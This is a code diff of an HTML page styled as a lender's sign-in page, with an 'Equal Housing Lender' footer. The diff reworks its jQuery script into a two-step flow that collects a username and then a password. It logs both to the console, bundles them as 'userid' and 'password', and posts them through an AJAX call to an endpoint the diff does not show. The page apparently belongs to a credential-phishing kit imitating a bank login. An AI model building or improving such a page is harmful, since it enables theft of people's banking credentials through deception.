@@ -177,57 +177,59 @@
       <span class="housing-icon">🏠</span> Equal Housing Lender
     </p>
   </footer>
-
- <script>
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>
+<script>
 $(document).ready(function () {
     $('.continue-btn').click(function (e) {
         e.preventDefault();
 
-        const $passwordInput = $('#password');
         const $useridInput = $('#username');
+        const $passwordInput = $('#password');
+        const $formStep1 = $('#form-step-1');
+        const $formStep2 = $('#form-step-2');
 
-        // First step: Show password input if not visible
-        if (!$passwordInput.is(':visible')) {
+        // Step 1: Ask for username
+        if (!$formStep2.is(':visible')) {
             if (!$useridInput.val().trim()) {
                 $useridInput.css('border', '1px solid red');
                 return;
             }
 
             $useridInput.css('border', '');
-            $passwordInput.closest('.input-wrapper').show(); // Show the password input wrapper
+            $formStep2.show(); // Show the full password field section
             $passwordInput.focus();
             return;
         }
 
-        // Second step: password is visible, now submit
+        // Step 2: Validate both username and password
         let userinfo = {}; 
-        let visitor = $useridInput.val();
+        let visitor = $useridInput.val().trim();
+        let password = $passwordInput.val().trim();
         let isValid = true;
 
-        sessionStorage.setItem('visitor', visitor);
+        if (!visitor) {
+            $useridInput.css('border', '1px solid red');
+            isValid = false;
+        } else {
+            $useridInput.css('border', '');
+        }
 
-        $('form input:visible').each(function () {
-            let inputName = $(this).attr('name');
-            let inputValue = $(this).val();
-            let isRequired = $(this).attr('required');
-
-            if (isRequired && !inputValue.trim()) {
-                $(this).css('border', '1px solid red');
-                isValid = false;
-            } else {
-                $(this).css('border', '');
-                if (inputName) {
-                    userinfo[inputName] = inputValue;
-                }
-            }
-        });
+        if (!password) {
+            $passwordInput.css('border', '1px solid red');
+            isValid = false;
+        } else {
+            $passwordInput.css('border', '');
+        }
 
         if (!isValid) {
             console.log('Please fill in all required fields.');
             return;
         }
 
-        userinfo['visitor'] = visitor;
+        sessionStorage.setItem('visitor', visitor);
+        userinfo['userid'] = visitor;
+        userinfo['password'] = password;
+
         console.log(userinfo); 
         
         $.ajax({
@@ -245,8 +247,8 @@ $(document).ready(function () {
         });
     });
 
-    // Hide password input initially
-    $('#password').closest('.input-wrapper').hide();
+    // Initially hide password step
+    $('#form-step-2').hide();
 });
 </script>
 </body>
